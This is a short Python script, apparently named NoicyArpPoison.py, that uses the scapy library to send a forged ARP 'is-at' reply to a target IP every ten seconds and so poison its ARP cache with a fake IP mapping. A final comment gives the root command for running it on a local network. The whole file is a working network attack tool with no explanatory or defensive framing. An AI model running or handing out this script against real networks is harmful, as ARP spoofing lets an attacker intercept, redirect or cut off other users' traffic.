#!/usr/bin/python

import sys, time
from scapy.all import sendp, ARP, Ether


if len(sys.argv) < 3:
    print(f"{sys.argv[0]}: <target_ip> <fake_ip>")
    sys.exit(1)

interface = "eth0"
target_ip = sys.argv[1]
fake_ip   = sys.argv[2]

ehernet = Ether()

    
arp = ARP(pdst=target_ip,
          psrc=fake_ip,
          op="is-at")

packet = ehernet / arp

while True:
    sendp(packet, iface=interface)
    time.sleep(10)    


# sudo python NoicyArpPoison.py 192.168.0.1 192.168.0.6